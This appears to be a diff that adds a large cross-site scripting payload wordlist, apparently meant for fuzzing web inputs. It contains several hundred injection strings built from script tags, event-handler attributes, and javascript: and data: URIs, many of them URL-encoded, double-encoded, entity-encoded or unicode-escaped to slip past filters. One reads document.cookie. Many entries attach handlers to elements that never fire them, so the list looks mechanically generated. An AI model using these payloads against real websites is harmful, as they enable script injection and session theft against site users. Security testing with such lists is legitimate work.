+<input onclick=alert(1)>
+<textarea onmouseleave="alert(1)">
+javascript:alert(58)
+<img src=x onerror=alert(50)>
+<script>alert(67)</script>
+<iframe onmouseover="alert(1)">
+<audio onblur=alert(1)>
+<svg/onload=alert(39)>
+<embed onwheel='alert(1)'>
+%3Cvideo src=x onload=alert(1)%3E
+&lt;svg onload="alert(1)"&gt;
+<td oncontextmenu='alert(1)'>
+<link onerror='alert(1)'>
+<textarea onchange=alert(1)>
+<a ondrag="alert(1)">
+<button onsubmit=alert(1)>
+<link onclick=alert(1)>
+<video oninput="alert(1)">
+<img onkeydown="alert(1)">
+<img src=x onerror=alert(76)>
+<embed src=x onkeydown=alert(1)>
+%3Cinput onerror=alert(1)%3E
+<video onblur='alert(1)'>
+<form onload='alert(1)'>
+<embed onkeyup='alert(1)'>
+&lt;svg onerror='alert(1)'&gt;
+<select ondrag=alert(1)>
+<textarea onkeydown="alert(1)">
+<td oninput='alert(1)'>
+<textarea onblur="alert(1)">
+<iframe src=x onscroll=alert(1)>
+<span onload='alert(1)'>
+<img src=x onerror=alert(26)>
+<script>alert(21)</script>
+<svg oninput='alert(1)'>
+<img src=x oninput=alert(1)>
+javascript:alert(39)
+<link ondrop="alert(1)">
+<img oninput=alert(1)>
+<iframe onwheel='alert(1)'>
+&lt;link onerror='alert(1)'&gt;
+<details onmouseleave='alert(1)'>
+<link onblur="alert(1)">
+<body onkeyup=alert(1)>
+javascript:void(alert(1))
+<input ondblclick='alert(1)'>
+<iframe onchange="alert(1)">
+<video src=x ondrop=alert(1)>
+<button oninput='alert(1)'>
+<svg onmouseenter="alert(1)">
+<object onkeydown='alert(1)'>
+<video src=x onfocus=alert(1)>
+<div onmouseleave=alert(1)>
+&lt;img onerror=alert(1)&gt;
+&lt;button onerror=alert(1)&gt;
+<svg/onload=alert(56)>
+<svg/onload=alert(66)>
+<table onload='alert(1)'>
+<body onsubmit='alert(1)'>
+<script
+>alert(1)</script>
+<td ondrop="alert(1)">
+<body onkeyup='alert(1)'>
+<\u0073cript>console.log(1)</\u0073cript>
+javascript:alert(69)
+<video src=x onblur=alert(1)>
+<link onchange='alert(1)'>
+<iframe onmouseout="alert(1)">
+<form onchange=alert(1)>
+<button onmouseenter=alert(1)>
+<table ondblclick='alert(1)'>
+<audio ondrag='alert(1)'>
+<svg/onload=alert(16)>
+<script>alert(29)</script>
+<iframe onkeyup="alert(1)">
+&lt;audio src=x onerror=alert(1)&gt;
+<form onkeyup="alert(1)">
+<audio src=x onsubmit=alert(1)>
+%253Cscript%253Eprompt(1)%253C/script%253E
+<svg onsubmit="alert(1)">
+javascript:alert(16)
+<a onmouseenter="alert(1)">
+<embed onscroll=alert(1)>
+<span onchange='alert(1)'>
+<form oninput=alert(1)>
+%3Csvg onload=alert(1)%3E
+<table onwheel="alert(1)">
+<svg onclick="alert(1)">
+<table onkeyup="alert(1)">
+<audio onmouseout="alert(1)">
+<span onmouseout="alert(1)">
+<img src=x onerror=alert(27)>
+<iframe onmouseenter="alert(1)">
+<link onerror=alert(1)>
+<span onkeyup=alert(1)>
+<form ondrag='alert(1)'>
+<svg><animate onbegin=alert(1)>
+<span onblur=alert(1)>
+<select onkeypress="alert(1)">
+<iframe onblur='alert(1)'>
+<form onmouseenter="alert(1)">
+<svg/onload=alert(44)>
+<marquee onkeydown=alert(1)>
+<a ondblclick='alert(1)'>
+<img src=x onerror=alert(84)>
+<iframe oninput="alert(1)">
+<script>alert(76)</script>
+%3Cbutton onerror='alert(1)'%3E
+<video ondblclick=alert(1)>
+<img src=x onerror=alert(77)>
+<table onblur=alert(1)>
+<embed ondblclick='alert(1)'>
+&lt;audio onerror="alert(1)"&gt;
+<details onfocus=alert(1)>
+<img onwheel=alert(1)>
+<details onclick=alert(1)>
+<audio ondrag="alert(1)">
+<img src=x onscroll=alert(1)>
+&lt;input onerror=alert(1)&gt;
+<marquee onkeypress=alert(1)>
+<audio onblur="alert(1)">
+<script>alert(1)</script>
+<table onload="alert(1)">
+<video onmouseout="alert(1)">
+<script>alert(46)</script>
+<script>alert(50)</script>
+<img src=x onerror=alert(96)>
+<a onkeyup='alert(1)'>
+<button ondblclick='alert(1)'>
+<textarea onmouseout="alert(1)">
+<select onmouseover=alert(1)>
+javascript:alert(88)
+<script>alert(94)</script>
+<input onchange="alert(1)">
+<svg/onload=alert(23)>
+<div onload=alert(1)>
+<form onmouseleave=alert(1)>
+<input onmouseout="alert(1)">
+<img src=x onerror=alert(38)>
+<embed ondrop=alert(1)>
+<select onclick='alert(1)'>
+<details onwheel='alert(1)'>
+<marquee onscroll="alert(1)">
+<iframe onmouseout='alert(1)'>
+<script>alert(98)</script>
+<span onkeypress='alert(1)'>
+<audio src=x onkeyup=alert(1)>
+<object onmouseout='alert(1)'>
+<body onmouseover="alert(1)">
+<img src=x onerror=alert(57)>
+%3Cbody onload=alert(1)%3E
+<embed src=x ondrop=alert(1)>
+%253Cmarquee onerror='alert(1)'%253E
+<div ondblclick="alert(1)">
+&lt;video onload=alert(1)&gt;
+<input ondrag=alert(1)>
+<img onblur=alert(1)>
+<form onkeyup=alert(1)>
+<object onload="alert(1)">
+<td onsubmit="alert(1)">
+<td onwheel=alert(1)>
+<button onkeypress='alert(1)'>
+%3Cvideo onerror='alert(1)'%3E
+<svg/onload=alert(13)>
+<svg onmouseover=alert(1)>
+<div onclick="alert(1)">
+<table onmouseover='alert(1)'>
+<iframe src=x onmouseenter=alert(1)>
+<a ondblclick=alert(1)>
+<embed src=x onwheel=alert(1)>
+<form onscroll='alert(1)'>
+&lt;body onload='alert(1)'&gt;
+%3Cscript%3Eprompt(1)%3C/script%3E
+<textarea onkeypress=alert(1)>
+<td onclick='alert(1)'>
+<div oncontextmenu="alert(1)">
+<marquee ondrop="alert(1)">
+<details onfocus='alert(1)'>
+<form onfocus="alert(1)">
+<svg/onload=alert(58)>
+<div onfocus=alert(1)>
+data:text/html,<script>alert(1)</script>
+<link oncontextmenu="alert(1)">
+<embed onsubmit='alert(1)'>
+%3Cinput onload='alert(1)'%3E
+<img onblur='alert(1)'>
+javascript:alert(72)
+<script>alert(62)</script>
+<video onscroll='alert(1)'>
+<details onmouseout="alert(1)">
+<img onkeypress="alert(1)">
+%253Cimg onerror=alert(1)%253E
+<input ondrop="alert(1)">
+%3Cbutton onerror=alert(1)%3E
+<audio onmouseenter=alert(1)>
+<select onfocus="alert(1)">
+<td onscroll="alert(1)">
+javascript:alert(51)
+<select onmouseleave='alert(1)'>
+<img src=x onerror=alert(75)>
+<script>alert(75)</script>
+<iframe onkeypress=alert(1)>
+<input ondrag='alert(1)'>
+<input onmouseenter="alert(1)">
+javascript:alert(71)
+<button ondblclick="alert(1)">
+%253Ciframe onload=alert(1)%253E
+<audio onmouseleave="alert(1)">
+<details onclick="alert(1)">
+javascript:alert('XSS')
+<link onmouseenter=alert(1)>
+%253Cobject onerror='alert(1)'%253E
+<select oncontextmenu="alert(1)">
+<script>alert(88)</script>
+&lt;input onload=alert(1)&gt;
+<object onchange='alert(1)'>
+<img src=x onerror=alert(64)>
+<embed onsubmit=alert(1)>
+<select oncontextmenu='alert(1)'>
+<object oninput=alert(1)>
+%253Cmarquee onerror="alert(1)"%253E
+<svg/onload=alert(0)>
+<img onmouseenter=alert(1)>
+<audio src=x onmouseover=alert(1)>
+%3Ciframe onload="alert(1)"%3E
+<div onerror='alert(1)'>
+<script	>alert(1)</script>
+<td onclick=alert(1)>
+<script>alert(19)</script>
+<table onclick="alert(1)">
+<body onsubmit="alert(1)">
+<input onkeypress=alert(1)>
+<details onsubmit=alert(1)>
+<img src=x onerror=alert(69)>
+<img src=x onerror=alert(81)>
+<audio src=x oninput=alert(1)>
+<embed src=x onsubmit=alert(1)>
+<embed onkeypress=alert(1)>
+<details onkeydown="alert(1)">
+<img src=x onsubmit=alert(1)>
+<div onerror="alert(1)">
+<video onerror=alert(1)>
+<span ondrop="alert(1)">
+<img onclick=alert(1)>
+<span onmouseenter="alert(1)">
+javascript:alert(57)
+<img onmouseleave="alert(1)">
+<td onkeypress="alert(1)">
+<iframe onkeydown="alert(1)">
+<iframe ondrop=alert(1)>
+<svg/onload=alert(1)>
+%3Cobject onerror=alert(1)%3E
+<svg onload="alert(1)">
+<marquee onfocus=alert(1)>
+<td ondblclick=alert(1)>
+<form onsubmit=alert(1)>
+<marquee onsubmit='alert(1)'>
+<embed oncontextmenu=alert(1)>
+<textarea onchange="alert(1)">
+<details onkeydown='alert(1)'>
+%253Csvg onerror="alert(1)"%253E
+%253Cinput onerror="alert(1)"%253E
+%253Ciframe onerror=alert(1)%253E
+<iframe src=x onwheel=alert(1)>
+<select onerror=alert(1)>
+<select onkeydown='alert(1)'>
+<img src=x onerror=alert(70)>
+%3Cselect onerror="alert(1)"%3E
+<button onerror="alert(1)">
+<select onkeyup='alert(1)'>
+&lt;video src=x onerror=alert(1)&gt;
+<span oncontextmenu="alert(1)">
+<img src=x ondrag=alert(1)>
+<svg/onload=alert(84)>
+<a onblur="alert(1)">
+<textarea oncontextmenu='alert(1)'>
+<div onkeyup=alert(1)>
+<embed onwheel=alert(1)>
+<embed onkeydown="alert(1)">
+<svg onscroll='alert(1)'>
+<video onkeydown=alert(1)>
+&lt;span onerror=alert(1)&gt;
+<script>alert(18)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+<img ondrag='alert(1)'>
+<table oninput=alert(1)>
+<audio src=x oncontextmenu=alert(1)>
+<body onfocus="alert(1)">
+<audio onsubmit='alert(1)'>
+<div onchange=alert(1)>
+<form onmouseover="alert(1)">
+<img src=x onerror=alert(85)>
+<svg/onload=alert(47)>
+%3Cscript%3Ealert(document.cookie)%3C/script%3E
+<img src=x onerror=alert(28)>
+<svg/onload=alert(36)>
+<button oncontextmenu=alert(1)>
+<embed oncontextmenu="alert(1)">
+<textarea oncontextmenu="alert(1)">
+javascript:alert(76)
+<object onblur="alert(1)">
+<div onmouseout=alert(1)>
+<\u0073cript>alert(1)</\u0073cript>
+<div onfocus='alert(1)'>
+<script>alert(38)</script>
+<embed onblur="alert(1)">
+<img ondrop='alert(1)'>
+<object onsubmit="alert(1)">
+<textarea onmouseover="alert(1)">
+<img src=x onerror=alert(3)>
+<audio oninput=alert(1)>
+<input onblur="alert(1)">
+<embed src=x ondblclick=alert(1)>
+<input onscroll='alert(1)'>
+%3Cscript%3EsetInterval(alert(1),0)%3C/script%3E
+<marquee onkeyup=alert(1)>
+javascript:alert(77)
+%3Cvideo onload=alert(1)%3E
+<svg/onload=alert(61)>
+<img src=x onerror=alert(42)>
+<video onmouseleave='alert(1)'>
+javascript:alert(62)
+<iframe onmouseenter=alert(1)>
+<svg/onload=alert(37)>
+<audio src=x onwheel=alert(1)>
+<select onerror="alert(1)">
+<iframe onwheel="alert(1)">
+<iframe onkeydown=alert(1)>
+<table onkeyup='alert(1)'>
+<img src=x onerror=alert(46)>
+<img onerror=alert(1)>
+<details onscroll="alert(1)">
+<link onchange=alert(1)>
+<img ondrop=alert(1)>
+<link onfocus='alert(1)'>
+<form ondrop=alert(1)>
+<link onmouseenter='alert(1)'>
+<input onsubmit="alert(1)">
+<video ondrop=alert(1)>
+<div ondrag='alert(1)'>
+<button onkeypress=alert(1)>
+<script>alert(4)</script>
+<svg/onload=alert(17)>
+<iframe src=x ondrop=alert(1)>
+<td oncontextmenu="alert(1)">
+<input onfocus=alert(1)>
+<img onkeyup=alert(1)>
+<object onmouseleave=alert(1)>
+&lt;table onerror=alert(1)&gt;
+%3Ctable onerror="alert(1)"%3E
+<span onmouseenter='alert(1)'>
+<details onload=alert(1)>
+<select onscroll="alert(1)">
+%253Ctd onerror="alert(1)"%253E
+<table onload=alert(1)>
+&lt;details onerror='alert(1)'&gt;
+<td onerror=alert(1)>
+<\u0073cript>setInterval(alert(1),0)</\u0073cript>
+<embed src=x oncontextmenu=alert(1)>
+&lt;textarea onerror='alert(1)'&gt;
+<marquee onmouseleave="alert(1)">
+<body onchange=alert(1)>
+<img src=x onerror=alert(92)>
+<select oncontextmenu=alert(1)>
+<textarea onfocus=alert(1)>
+<img onmouseleave='alert(1)'>
+<body onwheel='alert(1)'>
+<link onkeyup=alert(1)>
+<embed onwheel="alert(1)">
+<td onsubmit='alert(1)'>
+<svg oncontextmenu=alert(1)>
+<script>alert(93)</script>
+<table onkeyup=alert(1)>
+<svg onwheel='alert(1)'>
+<script>alert(42)</script>
+<video onchange='alert(1)'>
+<svg/onload=alert(32)>
+<script>alert(71)</script>
+<script>alert(36)</script>
+<div onkeyup='alert(1)'>
+<select ondblclick=alert(1)>
+<td onmouseover=alert(1)>
+<img onload=alert(1)>
+<img onsubmit="alert(1)">
+<select onwheel=alert(1)>
+&lt;iframe onload=alert(1)&gt;
+<video onblur="alert(1)">
+<input onkeydown='alert(1)'>
+&lt;a onerror="alert(1)"&gt;
+<textarea onsubmit=alert(1)>
+%3Cmarquee onerror='alert(1)'%3E
+<img src=x onerror=alert(18)>
+javascript:alert(30)
+<details onkeypress='alert(1)'>
+<table onwheel=alert(1)>
+<body ondrop=alert(1)>
+<img src=x onerror=alert(0)>
+<svg/onload=alert(31)>
+<svg/onload=alert(49)>
+<div onmouseout="alert(1)">
+%3Ciframe onerror=alert(1)%3E
+<img oncontextmenu="alert(1)">
+<object onmouseover=alert(1)>
+<select onclick="alert(1)">
